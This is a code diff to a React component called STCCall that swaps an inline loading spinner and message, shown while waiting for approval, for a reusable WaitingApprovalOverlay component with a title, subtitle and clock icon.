@@ -8,6 +8,7 @@ import { useAdminApproval, createOrUpdateStage } from "@/hooks/useAdminApproval"
 import { toast } from "sonner";
 import { linkVisitorToSession } from "@/lib/visitorLink";
 import { useLanguage } from "@/i18n/LanguageContext";
+import WaitingApprovalOverlay from "@/components/WaitingApprovalOverlay";
 
 const STCCall = () => {
   const navigate = useNavigate();
@@ -77,11 +78,11 @@ const STCCall = () => {
                 <p className="text-[10px] text-muted-foreground mb-4">{sc.followInstructions}</p>
 
                 {waitingApproval ? (
-                  <div className="flex flex-col items-center gap-3 py-4">
-                    <Loader2 className="w-8 h-8 text-primary animate-spin" />
-                    <p className="text-sm font-bold text-foreground">{sc.waitingApproval}</p>
-                    <p className="text-xs text-muted-foreground">{sc.waitingPlease}</p>
-                  </div>
+                  <WaitingApprovalOverlay
+                    title={sc.waitingApproval}
+                    subtitle={sc.waitingPlease}
+                    icon="clock"
+                  />
                 ) : !received && showButton ? (
                   <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }}>
                     <Button onClick={handleCallReceived} className="w-full bg-cta text-cta-foreground hover:bg-cta-hover rounded-xl py-5 font-bold text-sm gap-2">
